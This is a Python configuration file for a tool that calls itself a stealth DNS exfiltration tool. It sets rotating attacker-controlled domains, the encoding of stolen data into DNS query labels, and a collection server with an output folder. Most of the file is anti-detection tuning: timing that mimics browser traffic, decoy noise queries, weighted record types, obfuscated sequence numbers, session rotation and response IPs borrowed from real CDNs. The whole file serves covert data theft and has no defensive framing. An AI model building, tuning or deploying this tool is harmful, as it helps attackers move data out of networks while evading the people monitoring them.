"""Configuration for stealth DNS exfiltration tool."""

import os

# --- Domain Configuration ---
# Multiple domains for rotation (register several aged domains)
# NS records for each must point to your server
BASE_DOMAINS = [
    "analytics-cdn.example.com",
    "cdn-metrics.example.com",
    "static-assets.example.com",
]
# Active domain index (rotated automatically during transfer)
BASE_DOMAIN = BASE_DOMAINS[0]  # default, overridden at runtime

# --- Encoding Strategy ---
# "hex_split" = lower entropy hex labels with CDN-like prefixes
# "wordlist"  = each byte mapped to an English word (lowest entropy)
ENCODING_STRATEGY = "hex_split"
HEX_LABEL_LENGTH = 8       # total chars per label including prefix
LABELS_PER_QUERY = 3        # data labels per DNS query (reduced for shorter names)

# --- Compression ---
COMPRESS_DATA = True         # gzip before encoding (60-80% reduction)

# --- Integrity ---
HASH_ALGORITHM = "sha256"

# --- Anti-Detection: Timing (Poisson burst-silence model) ---
# Models real browser behavior with statistical randomness
BURST_SIZE_MIN = 3
BURST_SIZE_MAX = 12
INTRA_BURST_DELAY = (0.005, 0.08)    # seconds between queries in a burst
INTER_BURST_DELAY_MEAN = 8.0         # mean seconds between bursts (exponential dist)
INTER_BURST_DELAY_MIN = 1.0          # minimum gap
INTER_BURST_DELAY_MAX = 45.0         # maximum gap (long reading pause)

# --- Anti-Detection: Noise ---
NOISE_RATIO = 4                  # noise queries per data query
NOISE_DOMAINS_FILE = os.path.join(os.path.dirname(__file__), "noise_domains.txt")
DUPLICATE_QUERY_RATE = 0.20      # probability of re-sending a previous query
CACHE_HIT_DOMAINS = 15           # number of "frequently visited" domains to cache-repeat
CACHE_REPEAT_RATE = 0.10         # probability of repeating a cached noise domain

# --- Anti-Detection: Record Types ---
# Weighted distribution matching normal browsing patterns
QUERY_TYPE_WEIGHTS = {"A": 70, "AAAA": 25, "CNAME": 5}

# --- Anti-Detection: Sequence Obfuscation ---
# Sequence number is embedded inside encoded data, not as a separate label
SEQUENCE_BYTES = 2               # 2 bytes = supports up to 65535 chunks
SESSION_KEY_LENGTH = 4           # bytes, used to XOR sequence numbers

# --- Anti-Detection: Session Rotation ---
# Session ID rotates every N bursts to prevent correlation
SESSION_ROTATE_INTERVAL = 8      # rotate session ID every N bursts
SESSION_ID_LENGTH = 4             # hex chars for session identifier
# The server links rotated sessions via an encrypted session chain token

# --- Server (dns_server.py) ---
DNS_PORT = 53
RESPONSE_IP_POOL = {
    "A": [
        "104.16.132.229", "104.16.133.229",   # Cloudflare
        "172.67.134.180", "172.67.135.180",
        "104.21.45.67", "104.21.45.68",
        "13.107.42.14", "13.107.21.200",      # Microsoft/LinkedIn
        "151.101.1.69", "151.101.65.69",      # Fastly/Reddit
    ],
    "AAAA": [
        "2606:4700::6810:84e5", "2606:4700::6810:85e5",
        "2a06:98c1:3120::7", "2a06:98c1:3121::7",
    ],
    "CNAME": [
        "cdn.example-cdn.net.", "edge.example-cdn.net.",
        "lb.example-cdn.net.",
    ],
}
RESPONSE_TTL_RANGE = (30, 600)     # randomized TTL per response
OUTPUT_DIR = "./received/"

# --- Protocol ---
METADATA_PREFIX = "m"           # first label prefix for metadata queries
MAX_RETRIES = 5
